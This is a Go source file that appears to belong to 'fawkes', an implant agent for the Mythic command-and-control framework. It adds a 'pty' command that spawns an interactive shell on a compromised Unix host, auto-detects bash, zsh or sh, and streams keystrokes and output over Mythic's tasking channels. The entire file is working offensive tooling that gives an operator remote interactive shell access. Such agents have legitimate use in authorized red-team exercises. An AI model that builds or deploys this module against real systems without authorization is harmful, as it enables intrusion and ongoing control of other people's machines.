//go:build !windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"
	"time"

	"github.com/creack/pty"

	"fawkes/pkg/structs"
)

// PtyCommand provides an interactive PTY shell via Mythic's interactive tasking.
type PtyCommand struct{}

func (c *PtyCommand) Name() string        { return "pty" }
func (c *PtyCommand) Description() string { return "Start an interactive PTY shell session" }

type ptyParams struct {
	Shell string `json:"shell"` // Shell binary path (default: auto-detect)
	Rows  int    `json:"rows"`  // Initial terminal rows (default: 24)
	Cols  int    `json:"cols"`  // Initial terminal columns (default: 80)
}

func (c *PtyCommand) Execute(task structs.Task) structs.CommandResult {
	var params ptyParams
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &params)
	}

	// Auto-detect shell if not specified
	shell := params.Shell
	if shell == "" {
		shell = detectShell()
	}

	rows := params.Rows
	if rows <= 0 {
		rows = 24
	}
	cols := params.Cols
	if cols <= 0 {
		cols = 80
	}

	// Start shell with PTY
	cmd := exec.Command(shell)
	cmd.Env = os.Environ()

	ptmx, err := pty.StartWithSize(cmd, &pty.Winsize{
		Rows: uint16(rows),
		Cols: uint16(cols),
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to start PTY: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer ptmx.Close()

	// Send initial acknowledgment so Mythic knows PTY is running
	task.Job.InteractiveTaskOutputChannel <- structs.InteractiveMsg{
		TaskID:      task.ID,
		Data:        base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("PTY started: %s (%dx%d)\r\n", shell, cols, rows))),
		MessageType: structs.InteractiveOutput,
	}

	// Track completion from PTY output reader, input handler, and process exit
	var wg sync.WaitGroup
	exitCh := make(chan struct{})

	// Goroutine: read PTY output → send to Mythic
	wg.Add(1)
	go func() {
		defer wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := ptmx.Read(buf)
			if n > 0 {
				msg := structs.InteractiveMsg{
					TaskID:      task.ID,
					Data:        base64.StdEncoding.EncodeToString(buf[:n]),
					MessageType: structs.InteractiveOutput,
				}
				select {
				case task.Job.InteractiveTaskOutputChannel <- msg:
				case <-exitCh:
					return
				}
			}
			if err != nil {
				if err != io.EOF {
					// Send error message before exiting
					task.Job.InteractiveTaskOutputChannel <- structs.InteractiveMsg{
						TaskID:      task.ID,
						Data:        base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("\r\n[PTY read error: %v]\r\n", err))),
						MessageType: structs.InteractiveError,
					}
				}
				return
			}
		}
	}()

	// Goroutine: read Mythic interactive input → write to PTY
	wg.Add(1)
	go func() {
		defer wg.Done()
		for {
			select {
			case msg := <-task.Job.InteractiveTaskInputChannel:
				handleInteractiveInput(ptmx, msg, task.ID)
			case <-exitCh:
				return
			}
		}
	}()

	// Wait for process to exit or task to be killed
	processDone := make(chan error, 1)
	go func() {
		processDone <- cmd.Wait()
	}()

	select {
	case err := <-processDone:
		// Shell exited naturally
		close(exitCh)
		_ = err // normal exit
	case <-func() <-chan struct{} {
		// Poll for task stop
		ch := make(chan struct{})
		go func() {
			for !task.DidStop() {
				time.Sleep(250 * time.Millisecond)
			}
			close(ch)
		}()
		return ch
	}():
		// Task killed via jobkill
		close(exitCh)
		ptmx.Close()     // Close PTY to unblock reads
		_ = cmd.Process.Kill()
	}

	// Wait for I/O goroutines to finish
	wg.Wait()

	// Send exit message
	task.Job.InteractiveTaskOutputChannel <- structs.InteractiveMsg{
		TaskID:      task.ID,
		Data:        base64.StdEncoding.EncodeToString([]byte("")),
		MessageType: structs.InteractiveExit,
	}

	return structs.CommandResult{
		Output:    "PTY session ended",
		Status:    "success",
		Completed: true,
	}
}

// handleInteractiveInput processes a single interactive message from Mythic.
func handleInteractiveInput(ptmx *os.File, msg structs.InteractiveMsg, taskID string) {
	switch msg.MessageType {
	case structs.InteractiveInput:
		// Regular input — decode base64 and write to PTY
		data, err := base64.StdEncoding.DecodeString(msg.Data)
		if err != nil {
			return
		}
		_, _ = ptmx.Write(data)

	case structs.InteractiveExit:
		// Exit request — send EOF to shell
		_, _ = ptmx.Write([]byte{0x04}) // Ctrl+D

	case structs.InteractiveEscape:
		// Escape character
		_, _ = ptmx.Write([]byte{0x1b})

	default:
		// Control characters: InteractiveCtrlA(5) through InteractiveCtrlZ(30)
		// Map to actual byte values: Ctrl+A=0x01 through Ctrl+Z=0x1A
		if msg.MessageType >= structs.InteractiveCtrlA && msg.MessageType <= structs.InteractiveCtrlZ {
			ctrlByte := byte(msg.MessageType - structs.InteractiveCtrlA + 1)
			_, _ = ptmx.Write([]byte{ctrlByte})
		}
	}
}

// detectShell finds a usable interactive shell on the system.
func detectShell() string {
	// Check SHELL env var first
	if shell := os.Getenv("SHELL"); shell != "" {
		if _, err := os.Stat(shell); err == nil {
			return shell
		}
	}
	// Fallback: try common shells
	for _, sh := range []string{"/bin/bash", "/bin/zsh", "/bin/sh"} {
		if _, err := os.Stat(sh); err == nil {
			return sh
		}
	}
	return "/bin/sh"
}
